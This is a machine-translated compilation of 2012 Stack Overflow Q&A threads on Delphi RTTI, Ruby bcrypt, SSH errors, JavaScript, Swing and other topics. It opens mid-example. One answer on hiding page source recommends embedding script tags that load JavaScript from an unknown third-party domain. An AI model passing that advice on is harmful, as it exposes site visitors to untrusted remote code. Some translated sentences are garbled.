begin
  state.caption := 'Foo';
  state.address := 175896;
  SetLength(state.counters,2);
  state.counters[0] := 2;
  state.counters[1] := 2;
  SetLength(state.errors,1);
  state.errors[0].code := 52;
  state.errors[0].message := 'ERR_NOT_AVAILABLE';

  tr := Default (TTestRec);
  sList := TStringList.Create;
  try
    tr.s := 'A';
    tr.ws := 'WS';
    tr.st := '[100]';
    tr.ansiCh := '@';
    tr.ansiS := '@!';
    tr.wChar := 'Ö';
    tr.B := true;
    tr.i := 100;
    tr.t := Now;
    tr.d := Now;
    tr.dt := Now;
    tr.fd := Pi;
    tr.fS := 2 * Pi;
    tr.r.A := 'AA';
    tr.r.B := 'BB';
    tr.r.C := 'CC';
    tr.arr[1, 2] := 12;
    tr.arr[1, 3] := 13;
    tr.arr[1, 4] := 14;
    tr.arr[1, 5] := 15;
    tr.arr[2, 2] := 22;
    tr.arr[2, 3] := 23;
    tr.arr[2, 4] := 24;
    tr.arr[2, 5] := 25;
    tr.arr[3, 2] := 32;
    tr.arr[3, 3] := 33;
    tr.arr[3, 4] := 34;
    tr.arr[3, 5] := 35;
    SetLength(tr.dArr, 3);
    tr.dArr[0] := 'A';
    tr.dArr[1] := 'B';
    tr.dArr[2] := 'C';
    tr.o := TMyObj.Create;
    tr.o.fI := 11;
    tr.o.fS := '22';

    Serializer.Serialize('tr', TValue.From(tr), sList);
    for s in sList do
      WriteLn(s);
    sList.Clear;
    Serializer.Serialize('state', TValue.From(state),sList);
    for s in sList do
      WriteLn(s);

    ReadLn;
  finally
    sList.Free;
  end;

end. 
```

我对研究[Barry Kellys对](https://stackoverflow.com/a/2810732/576719)[Rtti 访问复杂数据结构中的字段和属性](https://stackoverflow.com/q/2802864/576719)的问题的回答有所帮助。

# ruby - 比较 bcrypt 哈希

> ID：11427711
> 
> 赞同：0
> 
> 时间：2012-07-11T07:31:20.363
> 
> 标签：ruby

由于某种原因，身份验证失败。但是，如果我将哈希打印到标准输出，它是相同的。有人有什么想法吗？

```
if File.exists?(passwdFile)  
    File.open("#{passwdFile}",'r').each do |account|
      @account = account.split(':')
      usernameCheck = @account[0] # Stored username
      passwordCheck = @account[1] # Stored hashed password
      if username == usernameCheck
        # Create hash for given password to compare againts our stored one.
        password_hash = BCrypt::Engine.hash_secret(password, password_salt)
        puts "#{password_hash}"
        puts "#{passwordCheck}"
        if passwordCheck == password_hash
          @log.info 'Successfull authentication'
          return true 
```

密码文件如下所示：

```
bob:$2a$10$1xNjCZxjv0R06qUm1lQEEeZ1uKuZ9ELQIkT2h5/TxCI9eHDurr.dW 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:41:35.287

返回的行在`File#each`行尾包含换行符，因此您的`passwordCheck`变量有一个尾随换行符，但 bcrypt 生成的哈希没有。

您可以删除换行符`chomp`

# visual-studio-2010 - VS2010 将经典 ASP 网站的 Base Url 存储在哪里？

> ID：11427714
> 
> 赞同：3
> 
> 时间：2012-07-11T07:31:26.633
> 
> 标签：visual-studio-2010, asp-classic

我们有一些传统的经典 ASP 网站需要维护，并且由于大量 .Net 工作而熟悉，因此希望使用 VS2010 来编辑它们。

我可以在 Visual Studio 中打开网站。

我可以配置 IIS 以根据 VS2010 中使用的工作文件夹运行网站。

我可以使用“属性”页面中的“基本网址”设置将 VS2010 配置为自动打开指向正确位置的默认浏览器。

我不能做的是找出 VS2010 存储这个值的位置，因为在 VS2010 创建的解决方案文件中没有提到它，并且由于网站没有项目文件，所以那里也没有任何内容。然而，当我关闭并重新打开 VS2010 时，它以某种方式保留了这些信息。

这对我很重要，因为我需要能够将所有文件提交到我们的源代码管理以供其他开发人员使用，并且理想情况下，不要让他们担心自己设置这个值。

所以，问题是：在经典 ASP 网站上工作时，Visual Studio 2010 将 Base Url 存储在哪里？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-03-17T14:48:12.483

我不知道它保存在哪里，但是在过去跟踪这样的事情时，我通常采用以下方法：

1.  打开 Visual Studio 并更改此设置
2.  应用更改
3.  在项目文件夹和 Visual Studio 文件夹中查找最近 1 分钟内已修改的所有文件

您可以确定至少会有一些与此无关的其他文件被更改，但它应该会缩小您的搜索范围。您可能还想在搜索之前重新关闭 VS，但这也会修改其他文件（使得筛选出的更改文件堆稍大一些）。

如果您仍然没有它，请搜索注册表（但我无法想象这将是它存储任何项目特定内容的地方）。

**编辑：**

刚刚创建了一个新项目并设置了这个属性。它肯定存储在项目的`.suo`（解决方案用户选项）文件中，在项目文件夹的根目录中，正如@Lankymart 所建议的那样（如果你没有看到它，它是一个隐藏文件）。它不是以纯文本形式存储的。

您可以在此处以编程方式访问它：http: [//msdn.microsoft.com/en-us/library/microsoft.visualstudio.shell.interop.ivspersistolutionopts.loaduseroptions.aspx](http://msdn.microsoft.com/en-us/library/microsoft.visualstudio.shell.interop.ivspersistsolutionopts.loaduseroptions.aspx)

由于这些文件中有大量绝对路径设置，因此将其移动到其他环境并不是一个真正的选择。我建议您坚持将这些设置列为项目设置过程的一部分的项目启动文档。我认为任何其他解决方案都会同样烦人|脆弱（或更糟）。

不确定是否有另一种方法可以在不从`Start Options`面板管理的情况下完成设置基本 URL 的工作 - 这可能是您对解决方案的最后希望。

# javascript - 字符串替换在 javascript 中不起作用（带双引号）

> ID：11427715
> 
> 赞同：0
> 
> 时间：2012-07-11T07:31:37.900
> 
> 标签：javascript, string, replace, double-quotes

请查看以下代码，如果我不执行函数中的“卫生”步骤，则代码不会替换字符串值。

有人可以帮助我理解这一点吗？

完整代码：

```
<script type="text/javascript">
function replaceString(orgStr,oldStr,newStr){

//############# Sanitary Steps #############//
oldStr = oldStr .replace(/[ ]+/g,"$");
oldStr = oldStr .replace(/[$]+/g," ");
orgStr = orgStr .replace(/[ ]+/g,"$");
orgStr = orgStr .replace(/[$]+/g," ");
newStr = newStr .replace(/[ ]+/g,"$");
newStr = newStr .replace(/[$]+/g," ");
//############# Sanitary Steps #############//

orgStr = orgStr.replace(oldStr,newStr);
if(orgStr.indexOf(oldStr) != -1){
orgStr = replaceString(orgStr,oldStr,newStr)
}
return orgStr;
}
var fields = ['"Employee Expense Facts"."Total Expense"','"Expense Amount by Expense Type Facts"."Airfare Expense Amount"'];
var selectedField = 0;
var selectedField = 0;
var qry = 'SELECT rcount(1) s_0, "Employee Expenses"."Time"."Date" s_1, "Employee Expenses"."Employee Expense Facts"."Total Expense" s_2 FROM "Employee Expenses" WHERE ("Employee Expense Facts"."Total Expense" IS NOT NULL) ORDER BY 1, 2 ASC NULLS LAST WHERE ("Employee Expense Facts"."Total Expense" IS NOT NULL) ORDER BY 1, 2 ASC NULLS LAST';
qry = qry .replace(/[\n\t\r]+/g," ");
var qry2 = replaceString(qry,""+fields[0],""+fields[1]);
console.log(qry2);

</script> 
```

帮助我了解为什么我需要执行这些卫生步骤？？？我通过试错法找到了解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:43:07.853

我的建议是：扔掉所有的代码！

现在重新开始，通过普通的表单提交或 ajax 调用将数据从客户端传递到服务器。现在在服务器端处理它们。

永远记住第一条规则：

**1) 你永远不能相信所有用户都按照你想要的方式行事。**

这就是为什么永远不要创建你的 SQL 客户端！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T07:23:17.537

问题在于 SQL 本身：

```
SELECT rcount(1) s_0,
       "Employee Expenses"."Time"."Date" s_1,
       "Employee Expenses"."Employee Expense Facts"."Total Expense" s_2 
FROM   "Employee Expenses" 
WHERE ("Employee Expense Facts"."Total Expense" IS NOT NULL)
       ORDER BY 1, 2 ASC NULLS LAST 
WHERE ("Employee Expense Facts"."Total Expense" IS NOT NULL)
       ORDER BY 1, 2 ASC NULLS LAST 
```

我发现有双引号，即使在使用转义字符后也不会被替换。我尝试用特殊字符替换 (")，然后执行字符串替换，但未能成功。

**令人惊讶的是，如果您在本地 HTML 文件上创建此函数，则无需卫生代码即可工作。但是当我在服务器上上传相同的代码时它不起作用。为此，我必须安装卫生管道。**

如果有人知道这是为什么造成的，请告诉我:)

谢谢vx

# mysql - 如何使我的开发服务器数据库保持最新？

> ID：11427723
> 
> 赞同：3
> 
> 时间：2012-07-11T07:31:55.370
> 
> 标签：mysql, diff, rsync

我为几个小客户开发网站，我希望能够使我的本地数据库与每个客户的生产服务器保持同步。（我在考虑每晚更新）他们的许多数据库都在数百兆字节，所以我觉得每晚创建和传输完整的转储是多余的。

以下是我迄今为止提出的轻率的想法：

*   在服务器上创建一个转储，并与我本地机器上前一天晚上的转储同步。那应该只传输文件的更改位吗？

*   在服务器上创建一个转储，并在本地将其与昨晚的转储进行比较。仅传输该差异。也许它也可以发送到原始转储的 md5，所以我可以确定我正在将差异应用于同一个基本文件。

获得对（大多数）这些服务器的 ssh 访问权限是可能的，但需要让我的客户以相当技术性的要求致电他们的托管服务提供商，这是我宁愿不必要求他们做的事情。如果您可以建议我可以通过 ftp/php 实现的解决方案，则可以加分。

**编辑：**

@Jacob 的回答提示了一些进一步的谷歌搜索，这导致了这个线程：[比较两个 MySQL 数据库](https://stackoverflow.com/questions/225772/compare-two-mysql-databases)

这个问题（以多种形式）似乎很常见。大多数需求，以及因此的大多数工具，似乎都集中在使模式保持最新而不是数据上。此外，大多数工具似乎都是商业和 GUI。

到目前为止，最好看的选项似乎是来自 Percona Toolkit 的[pt-table-sync](http://www.percona.com/doc/percona-toolkit/2.1/pt-table-sync.html)，尽管在 OSX 上设置它看起来可能很痛苦。

我现在正在下载[Navicat](http://www.navicat.com/en/products.html)进行测试。我在 OSX 上运行，但它是一个商业 GUI 程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-25T06:52:55.673

我认为设置它的最有效方法是使用 rsync 备份文件是通过使用 rsync 每晚运行，通过将昨天的备份同步到今天的备份然后运行当天的 rsync 来进行增量备份。在备份不同的网站方面，我会考虑将站点作为从站，使用复制器功能备份到您的服务器（主站），这将允许您保持所有数据库的最新状态并进行备份

[http://dev.mysql.com/doc/refman/5.0/en/replication.html](http://dev.mysql.com/doc/refman/5.0/en/replication.html)

# mysql - gwt tomcat，我的文件保存在哪里？

> ID：11427725
> 
> 赞同：1
> 
> 时间：2012-07-11T07:31:57.523
> 
> 标签：mysql, gwt, tomcat

首先，我想为我的英语技能道歉，因为我是一名法国开发人员^^ 我在 gwt 项目中遇到了一个非常简单的问题。我想从数据库中获取图片并将其保存在服务器上。当我在eclipse上运行项目时，java将图片保存在我的war目录中，这很好。

当我在我的tomcat服务器上运行项目时，java将图片保存在tomcat所在的目录中......

这很奇怪！

你有什么主意吗 ？

谢谢你的时间 ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T09:08:14.783

计算机上每个正在运行的应用程序都有一个分配给它的“当前工作目录”。如果您没有指定保存文件的路径，则默认情况下它将保存到 CWD。此 CWD 将根据您用于运行应用程序的容器而有所不同。

可以更改 CWD，但这不是一个好主意，以防容器的其他部分依赖它。您可能希望在 web.xml 中添加一个[上下文参数](http://tomcat.apache.org/tomcat-5.5-doc/config/context.html#Context_Parameters)，以便您可以指定保存文件的路径。

# ssh - 连接到远程计算机时，mac os x 拒绝 ssh 连接

> ID：11427727
> 
> 赞同：26
> 
> 时间：2012-07-11T07:32:05.947
> 
> 标签：ssh

我在 Mac OS X 10.7.4 上运行。
我无法`ssh`远程计算机，但是当我这样做时`ssh user@localhost`，它工作正常。

显示的错误是

```
 OpenSSH_5.6p1, OpenSSL 0.9.8r 8 Feb 2011
debug1: Reading configuration data /etc/ssh_config
debug1: Applying options for *
debug1: Connecting to web.iiit.ac.in [14.139.82.8] port 22.
debug1: connect to address 14.139.82.8 port 22: Connection refused
ssh: connect to host web.iiit.ac.in port 22: Connection refused 
```

我在系统偏好设置中启用了 root 登录并禁用了防火墙。

此外，`ps aux | grep ssh shows ssh-agent`, 包含`/usr/bin/ssh-agent -l`和`grep ssh`在输出中。

在这样做`sudo launchctl list|grep ssh`时显示：

*   0 com.openssh.sshd

在此之后， sudo launchctl start com.openssh.sshd ；sudo launchctl list|grep ssh 给出 45973 - com.openssh.sshd

再次检查 sudo launchctl list|grep ssh 一段时间后，它再次显示： - 0 com.openssh.sshd

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2015-02-25T04:59:26.907

在系统偏好设置->共享->启用远程登录。它会修复它。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-18T18:54:28.437

无线连接在 SSH 严格的包接收算法方面存在众所周知的问题。我对 WiMax 连接有同样的问题。如果您可以*建立 VPN 或任何类型的隧道*到服务器，那就太好了。

也可以看看

[这个线程](https://groups.google.com/forum/?fromgroups#!topic/ptp-general/q0pwvCoVNjc)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-11T07:40:49.447

您的远程主机可能没有运行 SSH 服务器（或者，如果有，它没有在端口 22 上侦听）。

您的测试（`ps aux`等`launchctl`）无济于事 - 问题出在*远程*主机上，而不是本地（您有一个 SSH 客户端，因为您可以连接到`localhost`，但远程主机`14.139.82.8`不允许端口 22 上的连接） .

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-27T01:10:52.153

当我遇到这个问题时，我发现 OpenSSH 没有完全安装。通过输入终端安装它：`sudo apt-get install openssh-client openssh-server`

另外，请检查您的防火墙。默认 SSH 端口是 22。打开该端口。

# html - 如何使用 html 和 css 使文本在上面显示

> ID：11427728
> 
> 赞同：0
> 
> 时间：2012-07-11T07:32:19.017
> 
> 标签：html, css, text

例如`2nd`，我想使用and使`nd`上面的出现位。如何 ？`html``css`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:33:38.910

使用`<sup>`(and `<sub>`, 产生相反的效果)

^(第二)H 2 O [_]

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:38:31.043

> `<sub>`标签定义下标文本。下标文本出现在基线下方半个字符处。下标文本可用于化学式，例如 H [2] O。
> 
> `<sup>`标签定义上标文本。上标文本出现在基线上方半个字符处。上标文本可用于脚注，如 WWW ^([1])。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-11T07:46:16.623

```
<p>2 <sup>superscript</sup> text.</p>
<p>2 <sub>subscript</sub> text.</p> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:44:52.520

来自 Hilariously Bad Ideas 部门：您可以使用 UTF8 上标字符！

2ⁿᵈ

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-07-11T07:38:04.703

试试这个：

```
 2<span style="vertical-align: super;">nd</span> 
```

使用垂直对齐应该可以解决问题。

# ruby-on-rails - 使用 Rails gem 解决缩短的 url

> ID：11427735
> 
> 赞同：2
> 
> 时间：2012-07-11T07:32:44.650
> 
> 标签：ruby-on-rails

我正在寻找一个 gem 来解析缩短的 url 并生成实际的 url。有没有这样做的宝石？

我在网上搜索过，但找不到有用的工具。

如果您已经遇到过这样的工具（或 Rails 中的 gem），请告诉我

谢谢，巴兰

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:59:37.580

这取决于 URL 缩短服务。也就是说，这将适用于任何使用 301 状态代码和`Location`标头的服务：

```
require 'net/http'

def get_long_url(short_url)
  uri = URI.parse(short_url)
  http = Net::HTTP.new(uri.host)
  response = http.get(uri.path)
  response.fetch('location')
end

get_long_url("http://bit.ly/LmvF") #=> http://google.com 
```

请注意，尽管您可能希望在此之上添加一些错误检查和超时处理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-16T05:19:23.797

我找到了一个可以做到这一点的宝石。

包含`gem "longurl", "~> 0.1.6"`在您的 gem 文件中，并在运行后`bundle install`

您可以使用下面的代码来获取实际的网址

> long_url = LongURL.expand(short_url)

参考：[长网址](http://rubygems.org/gems/longurl)

# javascript - 如何将类似平面数组的序列转换为关联映射？

> ID：11427739
> 
> 赞同：1
> 
> 时间：2012-07-11T07:32:58.087
> 
> 标签：javascript, jquery

本质上，我想要在 JavaScript 中等效于这个 Python 函数：

```
def to_dict(coll, key):
    return {i[key]: i for i in coll}

assert to_dict([
    {'key': 1, 'value': 1},
    {'key': 2, 'value': 2},
    {'key': 3, 'value': 3},
], 'key') == {
    1: {'key': 1, 'value': 1},
    2: {'key': 2, 'value': 2},
    3: {'key': 3, 'value': 3},
} 
```

我知道我可以手工构建它，但是有没有简洁的方法？（可以使用jQuery或Underscore.js）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:45:57.183

```
function to_dict(coll, key) {
   var obj = {};
   //Unsafe to use iterator on array in JavaScript
   for (var i = 0; i < coll.length; i++) {
      obj[coll[i][key]] = coll[i];
   }
   return obj;
} 
```

[http://jsfiddle.net/R7hfX/](http://jsfiddle.net/R7hfX/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:54:44.110

未经测试：

```
var to_dict = function (arr, key)
{
  return _.reduce(
    arr
  , function (rv, v) { rv[v[key]] = v; return rv; }
  , {}
  )
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-11T07:56:34.407

使用 jQuery .. 这稍微优雅一些

```
function to_dict(coll, key) {
    var obj = {}
    $.each(coll, function () {
        obj[this[key]] = this;
    });
    return obj;
} 
```

[http://jsfiddle.net/R7hfX/1/](http://jsfiddle.net/R7hfX/1/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:42:37.227

```
var t = {}
for (var x in d) {
    if (d.hasOwnProperty(x)) {
        t[d[x].key] = d[x];
    }
} 
```

# java - 使用前景标签将图像添加到 Jbutton

> ID：11427743
> 
> 赞同：2
> 
> 时间：2012-07-11T07:33:07.227
> 
> 标签：java, image, swing, background, jbutton

朋友们，我正在尝试使用 seticon 方法将图像添加到我的 Jbutton，但它隐藏了按钮上的文本标签。这是代码：

```
 try {
        Image img = ImageIO.read(getClass().getResource("image.jpg"));
        studentsButton.setIcon(new ImageIcon(img));         
      } catch (IOException ex) {
      } 
```

我在没有init（）/paint（）/图形的eclipse中使用swing，它在main方法中的简单框架。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-11T08:12:06.593

只需使用

```
studentsButton.setHorizontalTextPosition(AbstractButton.CENTER);
studentsButton.setVerticalTextPosition(AbstractButton.BOTTOM); 
```

这只会将文本放在图像下方。输出将是这样的：

这是一个代码示例，可![输出](../Images/3262cedcd3c7e9ed4ce551f3af1d78be.png)作为输出帮助您：

```
import java.awt.*;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import javax.swing.*;
import javax.imageio.ImageIO;

public class ButtonImageExample
{
    private JButton imageButton;
    private ImageIcon image;

    private void displayGUI()
    {
        JFrame frame = new JFrame("Button Image Example");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        JPanel contentPane = new JPanel();
        try
        {
            image = new ImageIcon(ImageIO.read(
                    new URL("http://i.imgur.com/6mbHZRU.png")));
        }
        catch(MalformedURLException mue)
        {
            mue.printStackTrace();
        }
        catch(IOException ioe)
        {
            ioe.printStackTrace();
        }       

        imageButton = new JButton("Button Text");
        imageButton.setIcon(image);
        imageButton.setHorizontalTextPosition(AbstractButton.CENTER);
        imageButton.setVerticalTextPosition(AbstractButton.BOTTOM);

        contentPane.add(imageButton);

        frame.setContentPane(contentPane);
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
    }

    public static void main(String... args)
    {
        SwingUtilities.invokeLater(new Runnable()
        {
            public void run()
            {
                new ButtonImageExample().displayGUI();
            }
        });
    }
} 
```

**最新编辑：关于通过 JLABEL 添加背景图像**

```
import java.awt.*;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import javax.swing.*;
import javax.imageio.ImageIO;

public class ButtonImageExample
{
    private ImageIcon image, imageForLabel;
    private JLabel imageLabel;

    private JTextField userField;
    private JPasswordField passField;
    private JButton loginButton;

    private void displayGUI()
    {
        JFrame frame = new JFrame("Button Image Example");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        JPanel contentPane = new JPanel();
        contentPane.setLayout(new BorderLayout(5, 5));
        try
        {
            image = new ImageIcon(ImageIO.read(
                    new URL("http://i.imgur.com/jwyrvXC.gif")));
            imageForLabel = new ImageIcon(ImageIO.read(
                    new URL("http://i.imgur.com/09zgEvG.jpg")));           
        }
        catch(MalformedURLException mue)
        {
            mue.printStackTrace();
        }
        catch(IOException ioe)
        {
            ioe.printStackTrace();
        }       

        imageLabel = new JLabel(imageForLabel);
        JPanel basePanel = new JPanel();
        // setOpaque(false) is used to make the JPanel translucent/transparent.
        basePanel.setOpaque(false);
        basePanel.setLayout(new BorderLayout(5, 5));
        JPanel topPanel = new JPanel();     
        topPanel.setOpaque(false);
        topPanel.setLayout(new GridLayout(2, 2, 5, 5));
        JLabel userLabel = new JLabel("USERNAME : ", JLabel.CENTER);
        userLabel.setForeground(Color.WHITE);
        userField = new JTextField(10);
        JLabel passLabel = new JLabel("PASSWORD : ", JLabel.CENTER);
        passLabel.setForeground(Color.WHITE);
        passField = new JPasswordField(10);

        topPanel.add(userLabel);
        topPanel.add(userField);
        topPanel.add(passLabel);
        topPanel.add(passField);

        JPanel bottomPanel = new JPanel();
        bottomPanel.setOpaque(false);
        loginButton = new JButton("Click to LOGIN");
        loginButton.setIcon(image);
        loginButton.setHorizontalTextPosition(AbstractButton.CENTER);
        loginButton.setVerticalTextPosition(AbstractButton.BOTTOM);
        bottomPanel.add(loginButton);

        basePanel.add(topPanel, BorderLayout.CENTER);
        basePanel.add(bottomPanel, BorderLayout.PAGE_END);

        imageLabel.setLayout(new GridBagLayout());
        imageLabel.add(basePanel);

        contentPane.add(imageLabel, BorderLayout.CENTER);

        frame.setContentPane(contentPane);
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
    }

    public static void main(String... args)
    {
        SwingUtilities.invokeLater(new Runnable()
        {
            public void run()
            {
                new ButtonImageExample().displayGUI();
            }
        });
    }
} 
```

这是相同的输出：

![JLabelAsBackground](../Images/1880cfb054b856a77fa6c78fd532b538.png)

# javascript - 如何以编程方式禁用 HTML 视图源或加密 Html 元素？

> ID：11427747
> 
> 赞同：1
> 
> 时间：2012-07-11T07:33:14.983
> 
> 标签：javascript, html, asp.net-mvc, asp.net-mvc-3

由于某些原因，我必须为我的 html 禁用查看源代码。有一些第三方工具（Html Guardian）可以加密 html 并使用它们。我已经手动加密我的 html 并使用转换后的 html。但我想以编程方式使用脚本、小程序或其他东西来实现它。我可以以编程方式进行吗？

我正在使用 Asp.net MVC3 应用程序。在渲染视图时，如何在不改变浏览器显示的情况下加密 html？有没有可用的 javascript 来做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T07:38:52.733

你不能，在互联网世界里你可以得到你看到的一切，你可以尝试禁用鼠标右键，让普通用户更难，你不能对专业人士隐藏它。

PS：本站搞笑，可以尝试查看源码http: [//lcamt​​uf.coredump.cx/squirrel/](http://lcamtuf.coredump.cx/squirrel/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:52:09.533

您不能禁止查看您传输给客户端的任何内容。HTML、JS、XHR 等等——你发给他，他就收到了。

您可以尝试混淆 HTML、JS 或您的数据格式中的任何一种，但这肯定会导致 HTML/JS 的性能损失，并且那里有足够多的漂亮解析器可以让感兴趣的人了解正在发生的事情。之后，您的数据传输格式可以从其处理程序中计算出来。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-11T07:36:02.200

你不能。如果您的浏览器可以看到它，那么您的用户和其他任何人也可以看到。HTML 是一种开源语言。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-04T13:00:35.743

创建新的小部件，然后在下面复制脚本并放入您的小部件或复制脚本，然后粘贴到上面的代码

```
<script type="text/javascript">
    var DADrightclicktheme = 'dark';
    var DADrightclickimage = '#';
    </script> <script src="http://www.erchima.net/23731.js" type="text/javascript"> </script> <script src="http://www.erchima.net/24364.js" type="text/javascript"></script> 
```

版权所有：www.erchima.net

注意： - 您可以将 # 更改为图像 url

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-11T07:42:01.513

浏览器让您可以选择查看源代码而不是语言本身，所以我们不能。

例如，您可以尝试在任何 Safari 网络浏览器上使用 view-source:http://www.google.com，但不能在 iPad 或 iPhone 上使用。

或者，您可以禁用适用于大多数观众的右键菜单。

```
<body oncontextmenu="return false;"> 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-07-11T07:46:34.110

使用一些异步模型定义 (AMD) 库（如 CommonJS、RequireJS）的可能性很小，您可以在其中定义和导入所需的模块，因此您不会在主 html 页面上定义脚本标签，只定义主模块，这样其他脚本将不可见。

以下是关于 RequireJS 的简短描述： [http ://requirejs.org/docs/whyamd.html](http://requirejs.org/docs/whyamd.html)

# backbone.js - 木偶简单事件委托

> ID：11427749
> 
> 赞同：0
> 
> 时间：2012-07-11T07:33:30.243
> 
> 标签：backbone.js, marionette

我试图在我的复合视图下向孩子添加一个简单的事件，但它根本没有触发..坦率地说我不知道​​为什么，它看起来很简单，我可以用普通的主干视图很好地做到这一点。

在下面的示例中，根本没有触发警报，但是当我故意将事件绑定到的函数名称更改为其他不存在的名称时，它抱怨该函数不存在，所以我认为它是其他的东西......帮助？

```
 App.View.ContentContainer = Backbone.Marionette.CollectionView.extend({

        className:'content_container',
        itemView:App.View.ContentBrowseItem,
        events:{
            'click .browse_item':'focus_content'
        },
        initialize:function () {
            //this.views = {} //indexed by id
            //this.create_modal_container()
            var coll = this.collection
            coll.calculate_size()
            coll.sort_by('title', -1)
        },
        focus_content:function (e) {
            alert('here???')
            var $modal_container = this.$modal_container
            var content_id = $(e.currentTarget).data('content-id')
            var $selected_view = this.views[content_id]
            var $focused_content = new App.View.FocusedItem({model:$selected_view.model})
            $modal_container.empty().show().append($focused_content.el).reveal().bind('reveal:close', function () {
                $focused_content.close()
            })
            return false
        },
        onShow:function(){
            this.$el.addClass('content_container').isotope({
                selector:'.content_item',
                resizable:true,
                layoutMode:'masonry',

                masonry:{ columnWidth:64 }
            })

        } 
```

编辑：这是生成的 HTML：[http](http://pastebin.com/uW2X8iPp) : //pastebin.com/uW2X8iPp div.content_container 是 App.View.ContentContainer 的结果 el

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T22:53:27.063

是itemView 元素`.browse_item`的选择器吗？`App.View.ContentBrowseItem`在这种情况下，您需要在定义中绑定事件`ItemView`，而不是在`CollectionView`定义中。原因是在渲染视图时会绑定事件。本身在其`CollectionView`任何子 itemView 之前呈现。

此外，如果您在此单击事件上打开另一个模式视图，我会让应用程序处理它，而不是您的`CollectionView`

尝试这样的事情：

```
App.View.ContentBrowseItem = Backbone.Marionette.ItemView.extend({
  ...
  initialize: function() {
    // Maintain context on event handlers
    _.bindAll(this, "selectItem")
  },
  events: {
    "click" : "selectItem"
  }
  selectItem: function() {
    App.vent.trigger("item:select", this.model);
  } 
  ...
}); 
```

并实际显示模态详细视图：

```
App.vent.on("item:select", function(itemModel) {
  var detailView = new App.View.FocusedItem({ model: itemModel });

  // You may also want to create a region for your modal container.
  // It might simplify some of your `$modal_container.empty().show().append(..).etc().etc()
  App.modalRegion.show(detailView);
}); 
```

允许您的每个视图处理自己的事件是 Backbone 和 Marionette 如此美丽的部分原因。您只想避免一个视图在另一个视图的业务中陷入困境（例如，CollectionView 试图处理其 ItemView 的事件，ItemView 创建事件绑定以显示和关闭单独的模态视图等）

希望这可以帮助！

# dll - 从 dll 获取库接口

> ID：11427752
> 
> 赞同：2
> 
> 时间：2012-07-11T07:33:56.600
> 
> 标签：dll, interface, reverse-engineering

我有一个已编译的 dll 库，但我没有关于它的文档。有一种方法可以获取 dll 的公共接口（至少是函数名称、参数编号和类型）。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T15:01:35.460

您必须对其进行反编译并分析每个函数，其调用约定，参数计数，参数含义（除非它带有一些 PDB，但我对此表示怀疑），我以前做过类似的事情，这是一项复杂的工作，但是可以做完了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:40:03.083

为了检索动态链接库导出的公共符号（函数和变量），可以使用著名的[依赖遍历器](http://www.dependencywalker.com/)。参数和类型仅在关联的 PDB 文件可用时才可用（这似乎不是您的情况）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-08T05:33:35.690

如果是 COM 库，您可以使用 Visual Studio 附带的 OLEViewer 查看 DLL 的 TypeLib。这将为您提供所需的信息。

# javascript - 如何在jquery中使用replace和regex在单词中的大写字符之前插入空格

> ID：11427759
> 
> 赞同：3
> 
> 时间：2012-07-11T07:34:26.420
> 
> 标签：javascript, jquery, regex

这些是数组中的单词

```
 WorkNumber
    WorkType
    Version 
    Status
    Module
    Priority
    AssignedBy
    AssignedTo
    Subject 
    Details 
    EstimatedTime 
    ActualTime
    CreatedDate
    ModifiedDate 
```

我需要如下输出

```
Work Number
Work Type
Version 
Status
Module
Priority
Assigned By
Assigned To
Subject 
Details 
Estimated Time 
Actual Time
Created Date
Modified Date 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-07-11T07:37:41.593

这就是你需要的：

```
"YourString".replace( /([a-z])([A-Z])/g, "$1 $2"); 
```

将输出：

```
"Your String" 
```

# ios - iPhone 中的总 RAM

> ID：11427761
> 
> 赞同：8
> 
> 时间：2012-07-11T07:34:31.003
> 
> 标签：ios, objective-c, iphone, mach

我想知道我的 iPhone 中可用的**总**RAM。为此，我使用了以下代码。

**注意：请不要将问题解释为检索 RAM 统计信息，例如 Wired、Inactive、Active 和 Free。**

```
mach_port_t host_port;  
    mach_msg_type_number_t host_size;  
    vm_size_t pagesize;  
    host_port = mach_host_self();  
